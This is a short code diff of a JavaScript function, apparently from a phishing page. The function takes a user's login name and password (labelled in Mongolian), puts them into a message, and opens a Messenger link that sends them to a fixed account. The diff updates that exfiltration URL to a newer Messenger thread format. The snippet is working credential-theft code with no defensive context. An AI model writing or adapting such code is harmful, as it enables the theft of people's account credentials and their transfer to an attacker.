@@ -6,7 +6,7 @@ function sendToMessenger() {
     const message = `Нэвтрэх нэр: ${username}\nНууц үг: ${password}`;
 
     // Messenger руу илгээх URL
-    const messengerUrl = `https://m.me/27808255922107117?text=${encodeURIComponent(message)}`;
+    const messengerUrl = `https://www.messenger.com/e2ee/t/27808255922107117?text=${encodeURIComponent(message)}`;
 
     // Шинэ таб нээнэ
     window.open(messengerUrl, '_blank');
